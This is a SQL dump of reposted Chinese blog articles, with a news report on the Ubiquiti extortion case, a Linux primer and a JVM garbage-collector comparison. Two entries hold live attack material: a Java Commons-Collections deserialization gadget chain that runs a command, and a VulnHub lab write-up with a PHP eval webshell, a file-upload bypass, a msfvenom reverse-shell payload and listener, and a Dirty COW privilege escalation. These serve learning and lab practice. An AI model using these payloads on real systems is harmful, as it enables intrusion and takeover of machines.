BadAttributeValueExpException(entry);<br />BadAttributeValueExpException val = new BadAttributeValueExpException(null);<br />//利用反射的方式来向对象传参<br />Field valfield = null;<br />try {<br />valfield = val.getClass().getDeclaredField(\"val\");<br />valfield.setAccessible(true);<br />valfield.set(val, entry);</p>\n<p>} catch (NoSuchFieldException e) {<br />e.printStackTrace();<br />} catch (IllegalAccessException e) {<br />e.printStackTrace();<br />}<br />return val;<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />为什么要用反射给BadAttributeValueExpException中的val赋值呢？因为在其的构造函数中存在<br />也就是如果直接传入会直接在初始化的时候就执行了val.toString()引爆我们的攻击链，攻击本机一次（hhhhh）</p>\n<p>完整测试代码：</p>\n<p>import org.apache.commons.collections.Transformer;<br />import org.apache.commons.collections.functors.ChainedTransformer;<br />import org.apache.commons.collections.functors.ConstantTransformer;<br />import org.apache.commons.collections.functors.InvokerTransformer;<br />import org.apache.commons.collections.keyvalue.TiedMapEntry;<br />import org.apache.commons.collections.map.LazyMap;</p>\n<p>import javax.management.BadAttributeValueExpException;<br />import java.io.*;<br />import java.lang.reflect.Field;<br />import java.util.HashMap;<br />import java.util.Map;</p>\n<p>public class Hello {<br />public static void main(String[] args) throws Exception {<br />TransformerTest test = new TransformerTest();<br /><br />//序列化<br />byte[] serializeByte = test.serialize(test.getObject());</p>\n<p>//反序列化<br />test.deserialize(serializeByte);<br />}</p>\n<p>}</p>\n<p><br />class TransformerTest {<br />public Object getObject() {<br />Transformer[] transformers = new Transformer[]{<br />new ConstantTransformer(Runtime.class),<br />new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}),<br />new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),<br />new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\",}),<br />};<br />Transformer transformerChain = new ChainedTransformer(transformers);</p>\n<p>// transformerChain.transform(null);<br />Map targetMap = LazyMap.decorate(new HashMap(), transformerChain);<br />// System.out.println(targetMap.get(\"anything\"));</p>\n<p>TiedMapEntry entry = new TiedMapEntry(targetMap, \"hack\");<br />// entry.toString();</p>\n<p>// BadAttributeValueExpException val = new BadAttributeValueExpException(entry);<br />BadAttributeValueExpException val = new BadAttributeValueExpException(null);<br />//利用反射的方式来向对象传参<br />Field valfield = null;<br />try {<br />valfield = val.getClass().getDeclaredField(\"val\");<br />valfield.setAccessible(true);<br />valfield.set(val, entry);</p>\n<p>} catch (NoSuchFieldException e) {<br />e.printStackTrace();<br />} catch (IllegalAccessException e) {<br />e.printStackTrace();<br />}<br />return val;<br />}</p>\n<p>public byte[] serialize(final Object obj) throws IOException {<br />ByteArrayOutputStream out = new ByteArrayOutputStream();<br />ObjectOutputStream objOut = new ObjectOutputStream(out);<br />objOut.writeObject(obj);<br />return out.toByteArray();<br />}</p>\n<p>public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {<br />ByteArrayInputStream in = new ByteArrayInputStream(serialized);<br />ObjectInputStream objIn = new ObjectInputStream(in);<br />return objIn.readObject();<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />40<br />41<br />42<br />43<br />44<br />45<br />46<br />47<br />48<br />49<br />50<br />51<br />52<br />53<br />54<br />55<br />56<br />57<br />58<br />59<br />60<br />61<br />62<br />63<br />64<br />65<br />66<br />67<br />68<br />69<br />70<br />71<br />72<br />73<br />74<br />参考<br />Java反序列化漏洞的原理分析<br />Java 反序列化过程深究<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「LDAx」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/qq_31028197/article/details/121666641</p>', '', 1, ',37,38,39,7,', '原创', '公开', '已发布', '', 565, '', '', 0, '2021-12-05 22:32:34', '2021-12-05 22:32:34');
INSERT INTO `article` VALUES (29, '程序员敲诈老板，或面临37年监禁', 1, '概述', '<p>据12月1日的报道，网络设备制造商优比快（Ubiquiti）的前雇员尼古拉斯&middot;夏普（nicholas Sharp）被捕，他被控窃取数据，并试图以告密者和匿名黑客的身份敲诈其雇主。</p>\n<p>&nbsp;</p>\n<p>美国联邦检察官达米安&middot;威廉姆斯（Damian Williams）称：&ldquo;尼古拉斯&middot;夏普利用他内部人士的权限，从其雇主那里窃取了千兆字节的机密数据，然后，他假装成一个匿名黑客，勒索该公司给予近200万美元的赎金。&rdquo;</p>\n<p>&ldquo;FBI搜查了夏普的家，发现他与Ubiquiti数据被盗的事件有关。夏普伪装成一个匿名的公司告密者，散布破坏性的新闻消息，谎称数据被盗是因为公司电脑系统存在漏洞，才让黑客有机可乘。&rdquo;</p>\n<p>窃取数据，敲诈未果<br />根据起诉书，夏普利用他的云管理员证书，于2020年12月10日窃取了Ubiquiti AWS的数据，2020年12月21日和22日从GitHub基础设施中窃取了数据，这些数据共计数十亿字节，他还通过SSH克隆了数百个GitHub存储库。</p>\n<p>在夏普窃取数据之后，今年1月，Ubiquiti公司披露了这起安全事件，并声称会努力补救安全漏洞所造成的影响，但与此同时，夏普假装成了一个匿名黑客，试图敲诈该公司。</p>\n<p>在勒索信中，他要求Ubiquiti公司拿出近200万美元，作为交换条件，他将归还被盗的文件，并告知公司一个尚存的漏洞。</p>\n<p>Ubiquiti公司拒绝支付赎金，该公司找到了进入其系统的第二个后门，并删除了这个入口，更改了所有员工的证件，并于1月11日发出了安全漏洞通知。</p>\n<p>恶意中伤，公司股价大跌<br />勒索失败后，夏普假装成知情人，与媒体分享了相关消息，并指责该公司企图淡化这一事件所造成的影响。这导致Ubiquiti的股价下跌约20%，从3月30日的349美元跌至4月1日的290美元，市值损失超过40亿美元。</p>\n<p>司法部称：&ldquo;夏普发布了误导性的新闻文章，指责公司对数据泄露的处理不当，再次中伤他的雇主，导致公司股价大幅下跌，市值损失了数十亿美元。&rdquo;</p>\n<p>4月1日，Ubiquiti证实，在1月份的数据泄露事件后，该公司成为了勒索的目标。夏普伪装成告密者质疑其雇主对数据泄露的处理方式，声称该事件所造成的实际影响是巨大的，然而，没有迹象表明客户的账户受到了影响。</p>\n<p>因网络中断而漏出马脚<br />在窃取数据的过程中，夏普试图用Surfshark的VPN服务隐藏他的IP地址。然而，他的实际地址在一次短暂的网络中断后暴露了出来。</p>\n<p>为了隐藏他的恶意行为，夏普还修改了日志保留策略和其他文件，这些文件在随后的调查中彻底暴露了他的身份。法庭文件中写道：&ldquo;夏普在AWS上的某些日志中应用了为期一天的生命周期保留政策，这使得入侵者的活动证据在一天内被删除。&rdquo; Ubiquiti没有日志记录系统，因此他们无法检查攻击者访问了哪些数据或系统。</p>\n<p>虽然美国司法部没有在新闻稿或起诉书中提到夏普的雇主，但所有的细节都与此前Ubiquiti数据被盗的消息以及夏普在LinkedIn账户上的信息完全一致。</p>\n<p>夏普面临四项罪名指控，如果罪名成立，他将面临最高37年的监禁。</p>\n<p>人们不禁好奇：这位员工敲诈公司的原因到底是什么？是利欲熏心还是因为跟公司有什么深仇大恨呢？或许在司法部门进一步的调查后会给出一个答案。</p>\n<p>参考链接：</p>\n<p>https://www.bleepingcomputer.com/news/security/former-ubiquiti-dev-charged-for-trying-to-extort-his-employer/<br />https://www.justice.gov/usao-sdny/press-release/file/1452706/download<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「TerryChu1」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/super111t/article/details/121673571</p>', '', 2, ',39,38,', '原创', '公开', '已发布', '', 1, '', '', 0, '2021-12-05 22:33:36', '2021-12-05 22:33:36');
INSERT INTO `article` VALUES (30, 'Vulnhub靶机 FristiLeaks 1.3 write up', 1, '概述', '<p>FristiLeaks 1.3write up<br />0x00 靶场搭建<br />0x01 信息收集<br />ip探测<br />端口服务识别<br />0x02 漏洞挖掘<br />web渗透思路<br />步骤一：浏览网页，爆破目录<br />步骤二：测试登录框<br />步骤三：ctrl+u 查看源码<br />步骤三：kali base64解码<br />步骤四：登录后台<br />步骤五：尝试上传php马<br />步骤六：蚁剑 连接webshell<br />步骤七：上个msf马吧（直接反弹shell 也可以）<br />0x03 提权<br />步骤八：提权<br />0x04 总结<br />0x00 靶场搭建<br />靶机下载</p>\n<p>https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova<br />1<br />靶机配置<br />VM搭建</p>\n<p>网络设为nat<br />按作者要求将网卡mac地址 设为</p>\n<p>08:00:27:A5:A6:76<br />1</p>\n<p><br />开机就会显现出IP</p>\n<p>&nbsp;</p>\n<p>攻击机<br />kali<br />win10<br />0x01 信息收集<br />ip探测<br />netdiscover -i eth0 -r 192.168.157.0/24<br />1<br />端口服务识别<br />masscan --rate=1000 -p 1-65535 192.168.157.163<br />1</p>\n<p><br />nmap -sC -sV -A -p 80 192.168.157.163 -o port.txt<br />1<br />开放的端口<br />只开放了 80<br />80/tcp open http Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)</p>\n<p>0x02 漏洞挖掘<br />web渗透思路<br />（1）页面枚举，查看各个页面功能点。<br />（2）手注+工具AWVS、APPscan、xray测试。<br />有cms的话 直接搜索cms对应版本漏洞利用。</p>\n<p>步骤一：浏览网页，爆破目录<br />（1）看主页功能点，源码，robots.txt 没有什么头绪<br />（2）用kali dirsearch win10 御剑 爆破目录。<br />爆破出 /images/ robots.txt 没有发现利用点<br />（3） 既然只开放了80端口 ，就肯定从web方面拿shell，说明 字典不够强大。尝试利用靶机名字 或者网页中的字符 作为 字典 枚举目录。<br />出现 /fristi</p>\n<p>欢迎来到管理员门户网站</p>\n<p>&nbsp;</p>\n<p>步骤二：测试登录框<br />先手动 尝试 万能密码 报错 没有成功<br />上sqlmap<br />也显示不存在注入 先放弃登录框</p>\n<p>步骤三：ctrl+u 查看源码<br />我们需要清理干净这些为了上线后。<br />为了测试更容易，我在这里留下一些东西。</p>\n<p>下边有base64 编码</p>\n<p>&nbsp;</p>\n<p>步骤三：kali base64解码<br />（1）用burp 解密后发现是png开头的图片，但是不能拷贝到txt中 转换为 png打开。</p>\n<p>（2）用kali 自带的base64 命令 解码 保存到 png文件中</p>\n<p>先将 base64 编码后的 字符 存储到 txt文件中</p>\n<p>然后</p>\n<p>base64 -d base64.txt &gt; base64_d.png<br />1<br />再打开文件管理器 图片位置 双击打开</p>\n<p>&nbsp;</p>\n<p>应该是 密码 keKkeKKeKKeKkEkkEk</p>\n<p>而用户名 猜想 应该是 留下这串&ldquo;后门&rdquo;的人</p>\n<p>&nbsp;</p>\n<p>步骤四：登录后台<br />用户名 为 eezeepz<br />密码 keKkeKKeKKeKkEkkEk</p>\n<p>登录成功</p>\n<p>直接就 显示出一个上传文件的功能 好直接。</p>\n<p>&nbsp;</p>\n<p>步骤五：尝试上传php马<br />（1）尝试上传1.php文件</p>\n<p>&lt;?php eval($_REQUEST[1]); ?&gt; <br />1<br />果然 有限制 白名单验证 只允许上传 png,jpg,gif格式</p>\n<p>（2） 想办法绕过</p>\n<p>整合信息收集结果</p>\n<p>Apache httpd 2.2.15<br />CentOS<br />PHP/5.3.3</p>\n<p>先尝试 apache 的多后缀解析 （虽然忘记影响的具体版本啦）<br />（3）上传抓包 将文件名修改为 webshell.php.jpg</p>\n<p><br />?? 直接就上传成功啦 没有显示文件名，只显示了 位置<br />（4）尝试以原文件名访问 上传后的文件</p>\n<p>http://192.168.157.163/fristi/uploads/webshell.php.jpg</p>\n<p><br />访问成功。</p>\n<p>步骤六：蚁剑 连接webshell<br />连接成功。</p>\n<p><br />步骤七：上个msf马吧（直接反弹shell 也可以）<br />可以ping 通外网</p>\n<p>ping 192.168.157.137 &gt; 1.txt<br />1</p>\n<p><br />（1）msf生成exe反向连接的木马</p>\n<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.157.137 LPORT=4444 -f elf &gt; shell.elf<br />1<br />（2）启动监听</p>\n<p>use exploit/multi/handler<br />set payload linux/x86/meterpreter/reverse_tcp <br />set LHOST 192.168.157.137<br />set LPORT 4444<br />run<br />1<br />2<br />3<br />4<br />5</p>\n<p><br />（3）用蚁剑上传木马到 靶机，并执行</p>\n<p>&nbsp;</p>\n<p>（4）反弹shell成功</p>\n<p><br />0x03 提权<br />步骤八：提权<br />（1） 用linux-exploit-suggester.sh工具 寻找内核漏洞</p>\n<p>uname -a 收集内核信息<br />1</p>\n<p><br />（2）查看提权建议</p>\n<p>./linux-exploit-suggester.sh -u \"Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux\"<br />1<br />（3）脏牛漏洞尝试</p>\n<p><br />（4） 搜索dirty cow</p>\n<p>searchsploit dirty cow<br />1<br />这里使用40839</p>\n<p><br />（5）下载脚本</p>\n<p>searchsploit -m 40839<br />1<br />（6）msf上传到靶机/tmp目录</p>\n<p>upload 40839.c /tmp<br />1</p>\n<p><br />（6）编译运行</p>\n<p>gcc -pthread 40839.c -o exp -lcrypt<br />1<br />执行 ./exp （密码 随意起）<br />./exp yuan</p>\n<p><br />成功</p>\n<p>（7） su firefart</p>\n<p><br />报错 必须在终端运行</p>\n<p>（8）python 启动终端 提权成功</p>\n<p>python -c \'import pty;pty.spawn(\"/bin/bash\")\'<br />su firefart<br />yuan<br />1<br />2<br />3</p>\n<p><br />0x04 总结<br />该靶机难度一般，<br />寻找后台废了点时间，通过结合 靶机名字 网页 关键信息 猜出来。<br />又通过开发为了方便在源码中留下的登录信息，获取密码，通过留下的用户名获取用户名登录后台。<br />文件上传 通过apache 多后缀解析绕过白名单。<br />提权 脏牛漏洞。<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「whoami。」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/YouthBelief/article/details/121684437</p>', '', 3, ',39,38,', '原创', '公开', '已发布', '', 0, '', '', 0, '2021-12-05 22:34:24', '2021-12-05 22:34:24');
INSERT INTO `article` VALUES (31, 'Linux操作系统基础', 5, '概述', '<p>文章目录<br />Linux简介<br />Linux介绍<br />Linux特点<br />CentOS<br />Linux目录结构<br />Linux常用命令<br />Linux命令的分类<br />操作文件或目录常用命令<br />常用命令<br />备份压缩命令<br />gzip命令<br />bzip2命令<br />tar命令<br />关机/重启命令<br />学习Linux的好习惯<br />Linux简介<br />Linux是一种自由和开放源码的操作系统，存在着许多不同的Linux版本，但它们都使用了Linux内核。Linux可安装在各种计算机硬件设备中，比如手机、平板电脑、路由器、台式计算机</p>\n<p><br />Linux介绍<br />Linux出现于1991年，是由芬兰赫尔辛基大学学生Linus Torvalds和后来加入的众多爱好者共同开发完成</p>\n<p>Linux特点<br />多用户，多任务，丰富的网络功能，可靠的系统安全，良好的可移植性，具有标准兼容性，良好的用户界面，出色的速度性能<br />开源</p>\n<p>CentOS<br />主流：目前的Linux操作系统主要应用于生产环境，主流企业级Linux系统仍旧是RedHat或者CentOS<br />免费：RedHat 和CentOS差别不大，基于Red Hat Linux 提供的可自由使用源代码的企业CentOS是一个级Linux发行版本<br />更新方便：CentOS独有的yum命令支持在线升级，可以即时更新系统，不像RedHat 那样需要花钱购买支持服务！<br />Linux目录结构</p>\n<p><br />bin (binaries)存放二进制可执行文件<br />sbin (super user binaries)存放二进制可执行文件，只有root才能访问<br />etc (etcetera)存放系统配置文件<br />usr (unix shared resources)用于存放共享的系统资源<br />home 存放用户文件的根目录<br />root 超级用户目录<br />dev (devices)用于存放设备文件<br />lib (library)存放跟文件系统中的程序运行所需要的共享库及内核模块<br />mnt (mount)系统管理员安装临时文件系统的安装点<br />boot 存放用于系统引导时使用的各种文件<br />tmp (temporary)用于存放各种临时文件<br />var (variable)用于存放运行时需要改变数据的文件<br />Linux常用命令<br />命令格式：命令 -选项 参数</p>\n<p>如：ls -la /usr</p>\n<p>ls：显示文件和目录列表(list)<br />1<br />2<br />3<br />常用参数：</p>\n<p>-l (long)<br />-a (all) 注意隐藏文件、特殊目录.和.. <br />-t (time)<br />1<br />2<br />3<br />Linux命令的分类<br />内部命令：属于Shell解析器的一部分</p>\n<p>cd 切换目录（change directory）<br />pwd 显示当前工作目录（print working directory）<br />help 帮助<br />1<br />2<br />3<br />外部命令：独立于Shell解析器之外的文件程序</p>\n<p>ls 显示文件和目录列表（list）<br />mkdir 创建目录（make directoriy）<br />cp 复制文件或目录（copy）<br />1<br />2<br />3<br />查看帮助文档</p>\n<p>内部命令：help + 命令（help cd）<br />外部命令：man + 命令（man ls）<br />1<br />2<br />操作文件或目录常用命令<br />pwd 显示当前工作目录（print working directory）<br />touch 创建空文件 <br />mkdir 创建目录（make directoriy）<br />-p 父目录不存在情况下先生成父目录 （parents） <br />cp 复制文件或目录（copy）<br />-r 递归处理，将指定目录下的文件与子目录一并拷贝（recursive） <br />mv 移动文件或目录、文件或目录改名（move）</p>\n<p>rm 删除文件（remove）<br />-r 同时删除该目录下的所有文件（recursive）<br />-f 强制删除文件或目录（force）<br />rmdir 删除空目录（remove directoriy）<br />cat显示文本文件内容 （catenate）<br />more、less 分页显示文本文件内容<br />head、tail查看文本中开头或结尾部分的内容<br />head -n 5 a.log 查看a.log文件的前5行<br />tail -F b.log 循环读取（follow）</p>\n<p>1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />常用命令<br />wc 统计文本的行数、字数、字符数（word count）<br />-m 统计文本字符数<br />-w 统计文本字数<br />-l 统计文本行数<br />find 在文件系统中查找指定的文件<br />find /etc/ -name \"aaa\"<br />grep 在指定的文本文件中查找指定的字符串<br />ln 建立链接文件（link）<br />-s 对源文件建立符号连接，而非硬连接（symbolic）</p>\n<p>top 显示当前系统中耗费资源最多的进程 <br />ps 显示瞬间的进程状态<br />-e /-A 显示所有进程，环境变量<br />-f 全格式<br />-a 显示所有用户的所有进程（包括其它用户）<br />-u 按用户名和启动时间的顺序来显示进程<br />-x 显示无控制终端的进程<br />kill 杀死一个进程<br />kill -9 pid<br />df 显示文件系统磁盘空间的使用情况</p>\n<p>du 显示指定的文件（目录）已使用的磁盘空间的总<br />-h文件大小以K，M，G为单位显示（human-readable）<br />-s只显示各档案大小的总合（summarize）<br />free 显示当前内存和交换空间的使用情况 <br />netstat 显示网络状态信息<br />-a 显示所有连接和监听端口<br />-t (tcp)仅显示tcp相关选项<br />-u (udp)仅显示udp相关选项<br />-n 拒绝显示别名，能显示数字的全部转化成数字。<br />-p 显示建立相关链接的程序名<br />ifconfig 网卡网络配置详解 <br />ping 测试网络的连通性</p>\n<p><br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />备份压缩命令<br />gzip 压缩（解压）文件或目录，压缩文件后缀为gz <br />bzip2 压缩（解压）文件或目录，压缩文件后缀为bz2 <br />tar 文件、目录打（解）包</p>\n<p>1<br />2<br />3<br />4<br />gzip命令<br />命令格式：gzip [选项] 压缩（解压缩）的文件名<br />-d将压缩文件解压（decompress）<br />-l显示压缩文件的大小，未压缩文件的大小，压缩比（list）<br />-v显示文件名和压缩比（verbose）<br />-num用指定的数字num调整压缩的速度，-1或--fast表示最快压缩方法（低压缩比），-9或--best表示最慢压缩方法（高压缩比）。系统缺省值为6</p>\n<p>1<br />2<br />3<br />4<br />5<br />6<br />bzip2命令<br />命令格式：bzip2 [-cdz] 文档名<br />-c将压缩的过程产生的数据输出到屏幕上<br />-d解压缩的参数（decompress）<br />-z压缩的参数（compress）<br />-num 用指定的数字num调整压缩的速度，-1或--fast表示最快压缩方法（低压缩比），-9或--best表示最慢压缩方法（高压缩比）。系统缺省值为6<br />1<br />2<br />3<br />4<br />5<br />tar命令<br />-c 建立一个压缩文件的参数指令（create）<br />-x 解开一个压缩文件的参数指令（extract）<br />-z 是否需要用 gzip 压缩<br />-j 是否需要用 bzip2 压缩<br />-v 压缩的过程中显示文件（verbose）<br />-f 使用档名，在 f 之后要立即接档名（file）</p>\n<p>1<br />2<br />3<br />4<br />5<br />6<br />7<br />关机/重启命令<br />shutdown系统关机 <br />-r 关机后立即重启<br />-h 关机后不重新启动<br />halt 关机后关闭电源 shutdown -h<br />reboot 重新启动 shutdown -r<br />1<br />2<br />3<br />4<br />5<br />学习Linux的好习惯<br />善于查看man page（manual）等帮助文档</p>\n<p>利用好Tab键</p>\n<p>掌握好一些快捷键</p>\n<p>ctrl + c（停止当前进程）<br />ctrl + r（查看命令历史）<br />ctrl + l（清屏，与clear命令作用相同）<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「c.」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/cckevincyh/article/details/80468296</p>', '', 4, ',40,', '原创', '公开', '已发布', '', 0, '', '', 0, '2021-12-05 22:36:51', '2021-12-05 22:36:51');
INSERT INTO `article` VALUES (32, '从JDK 8到JDK 17，GC都有哪些进步？', 5, '概述', '<blockquote>\n<p>作者 | Stefan Johansson<br />译者 | 弯月<br />出品 | CSDN（ID：CSDNnews）</p>\n</blockquote>\n<p>JDK17 发布已经几个月了，其中不仅包含很多新语言功能，而且与旧版 JDK 相比，性能提升也非常明显。与之前 LTS 版本的 JDK 8 和 JDK 11 相比，JDK17 的性能提升尤为明显。此次性能的提升大部分来自 JVM 的新功能和优化，在本文中我们就来重点谈一谈垃圾收集的改进。</p>\n<p>最近，我发表过一个演讲，重点介绍了自 JDK 8 以来 G1 中的新特性，本文将在此基础之上进一步扩展，以涵盖 Parallel GC 和 ZGC取得的进步。此外，我们还有第四个受支持的收集器：Serial GC，但没有包含在此次的比较之内。Serial 是一个稳定的收集器，开销很低，但本文涉及的基准测试需要高性能的 GC 才能正常工作。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/a04ea55479c3468aa02fea5805053e7b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ1NETui1hOiurw==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\" /></p>\n<h2><a name=\"t0\"></a><a id=\"_10\"></a>服务于不同的目标</h2>\n<p>有时，选择使用哪个垃圾收集器并非一目了然。重要的是需要明白，为了做出正确的选择，首先你需要搞清楚你的主要目标是什么。常见的目标包括优化吞吐量、延迟和/或资源占用情况。最佳解决方案当然是针对上述所有目标进行优化，并在每种情况下获得最佳性能。收集器力求从各个方面进行优化，但它们必须根据不同的目标做出不同的权衡。</p>\n<p>下面，快速介绍一下不同优化的含义：</p>\n<ul>\n<li>吞吐量：降低 GC 对可在指定时间内完成的事务总数的影响。</li>\n<li>延迟：降低 GC 对单个事务的影响。</li>\n<li>资源占用情况：降低GC 使用的额外资源。</li>\n</ul>\n<p>不同的权衡并不意味着无法从所有方面优化收集器。在优化收集器时，很大一部分工作是确保尽可能有效地进行权衡。还有一种全面改进的好方法是，重新评估旧的设计决策，并提出更好的解决方案。</p>\n<h2><a name=\"t1\"></a><a id=\"_JDK_8__22\"></a>自 JDK 8 以来的进步</h2>\n<p>自 JDK 8 以来取得的进步，我们能够看到所有收集器在各个方面都有或多或少的改进。为了更好地展示 GC 的进步，下面的比较将使用标准化分数来比较各个收集器。在此次比较中，我使用了SPECjbb&reg; 20151，堆大小设置为16GB。这是一个众所周知且非常稳定的基准测试，它的关注点不仅限于 GC 的性能，因此结果可以展示出整个 Java 平台的进步。这个基准测试有几种不同的模式，可以同时生成吞吐量指标和延迟指标。延迟指标是衡量响应时间限制下的吞吐量。</p>\n<p>对于暂停时间比较，我在固定负载下运行了一个小时的基准测试。也就是说，所有收集器都承担了相同级别的负载。</p>\n<p>最后请注意， ZGC 是 JDK 11（从 JDK15 正式投入使用）中引入的，因此我们只有两个 ZGC 数据点，而 G1 和 Parallel 有三个数据点。</p>\n<h2><a name=\"t2\"></a><a id=\"_31\"></a>吞吐量</h2>\n<p><img src=\"https://img-blog.csdnimg.cn/75de1aed0f9a4b9994b1f9e62df5902f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ1NETui1hOiurw==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\" /><br />通过以上吞吐量指标，我们可以看到与旧版本相比，所有收集器都有了明显的进步，其中 ZGC 的提升最大。在此次测试中，G1 和 Parallel 的原始吞吐量更好，但增大了堆空间后，ZGC 弥补了这一差距。<br />当谈到这个指标时，我们应该注意，我们测量的不仅仅是 GC 的性能。Java 平台的其他部分，例如 JIT 编译器，对这些提升也有一定的帮助。</p>\n<p><strong>延迟</strong></p>\n<p><img src=\"https://img-blog.csdnimg.cn/bb0b44378e6c4313a1a52d510099eb98.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ1NETui1hOiurw==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\" /><br />延迟的提升效果更明显。我们可以看到为缩短 GC 暂停时间所做的努力都得到了回报。当谈到这个指标时，我们应该明白实际上很多提升都是因为 GC 的改进。</p>\n<p>对于这个指标，G1 的进步最大。从延迟的角度来看，ZGC 也有了很大的改进。该图中并没有展示出提升最大的部分，因为该基准测试测量的是应用程序的延迟。ZGC 能够将暂停时间降到最低，我们看到其他因素也影响到了延迟的测试结果。如果我们深入研究暂停时间的改进，就会发现 ZGC 发挥了重要的作用。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/d7490d3de21d4a8a84f606539f207fce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ1NETui1hOiurw==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\" /></p>\n<p>我们来看看原始数据（因为标准化的暂停时间有点奇怪），我们可以看到JDK 17 中的 ZGC 远低于目标：亚毫秒级的暂停时间。G1 的目标是在延迟和吞吐量之间保持平衡，远低于其默认的目标：200 毫秒的暂停时间。该图表还包括额外的一栏，用于快速显示不同收集器如何处理可扩展性。ZGC 的设计会保证暂停时间不随堆的大小而改变，我们可以清楚地看到当堆扩大到 128GB 时的情况。从暂停时间的角度来看，G1比Parallel 更善于处理更大的堆，因为它能够保证暂停时间满足特定目标。</p>\n<h2><a name=\"t3\"></a><a id=\"_48\"></a>资源占用</h2>\n<p><img src=\"https://img-blog.csdnimg.cn/c3edbb0b3e744acc8abf5d75e943eede.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ1NETui1hOiurw==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\" /><br />该图比较了三个不同收集器原生内存的使用峰值。由于从这个角度来看 Parallel 和 ZGC 都非常稳定，因此我们应该看一看原始数字。我们可以看到 G1 在这方面确实有所改进，主要原因是所有功能和增强功能都提高了记忆集管理的效率 。</p>\n<p>即使其他收集器的开销并没有减少，但我们仍然应该记住，它们在其他方面有也有所改进，因此不必使用额外的内存。</p>\n<h2><a name=\"t4\"></a><a id=\"_54\"></a>升级</h2>\n<p>无论使用哪种收集器，与旧版本相比，JDK 17 的整体性能都有很大的提升。如果你正仍在使用 JDK 8 并计划升级，那么现在就可以重新评估打算使用的 GC。在 JDK 8 中，Parallel是默认设置，但在 JDK 9 中改为了 G1。从那以后，G1 的改进速度就超过了 Parallel，但在有些情况下可能 Parallel 仍然是最佳选择。而 ZGC（从 JDK 15 开始正式使用）的加入，成为了第三种高性能替代方案。</p>\n<p>参考链接：</p>\n<ul>\n<li>https://kstefanj.github.io/2021/11/24/gc-progress-8-17.html</li>\n</ul>', '', 5, ',7,', '原创', '公开', '已发布', '', 13, '', '', 0, '2021-12-05 22:38:40', '2021-12-05 22:38:40');
